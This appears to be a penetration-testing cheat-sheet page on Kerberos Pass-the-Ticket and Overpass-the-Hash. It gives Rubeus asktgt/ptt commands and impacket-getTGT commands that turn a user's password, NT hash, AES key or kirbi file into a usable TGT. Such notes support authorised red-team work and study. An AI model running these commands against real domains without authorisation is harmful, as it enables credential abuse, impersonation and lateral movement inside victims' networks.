---
label: Pass-the-Ticket (Kerberos)
subLabel: (Rubeus, getTGT)
---

# Pass-the-Ticket

> **Requirements**
>
> * Credentials (password, RC4/NT hash, AES key, kirbi file) of the target domain user.

Having the credentials of a domain user, we can ask the DC for a new TGT for that user and inject it into the current logon session. This TGT is then used for authentication (e.g. using `winrs` or accessing SMB shares) with privileges of the target user.

**Watch out for domain name!** It's very important in TGT request to use FQDN (e.g. `adlab.local` instead of `adlab`). Even if shortcut normally works, use FQDN in this case.

Windows:

> **IMPORTANT**: Only one TGT can be applied at a time to the current logon session, so the previous TGT is wiped when the new ticket is applied when using the `/ptt` option. You can omit the `/ptt` parameter to **save the TGT to a file** (not inject it into memory) and use it later.

```powershell
# Using password
./Rubeus.exe asktgt /user:$fqdn\$user /password:$password /ptt

# Using AES256 key
./Rubeus.exe asktgt /user:$fqdn\$user /aes256:$aes256_key /ptt

# Using RC4/NT hash (Overpass-the-Hash)
./Rubeus.exe asktgt /user:$fqdn\$user /rc4:$rc4 /ptt

# Inject TGT as base64 or .kirbi file
./Rubeus.exe ptt /ticket:$base64_or_kirbi_file

# Check TGT in memory
klist
klist tgt
```

{/*TODO: /createonlt parameter (elevation required)*/}

Linux (request TGT and save it to `.ccache` file):

```bash
# Using password
impacket-getTGT $fqdn/$user:$pass -dc-ip $dc_ip

# Using NT hash
impacket-getTGT $fqdn/$user -hashes :$nt_hash -dc-ip $dc_ip

# Using AES key
impacket-getTGT $fqdn/$user -aesKey $aes_key -dc-ip $dc_ip
```

## References

* [GhostPack, *Rubeus: asktgt*](https://github.com/GhostPack/Rubeus?tab=readme-ov-file#asktgt)
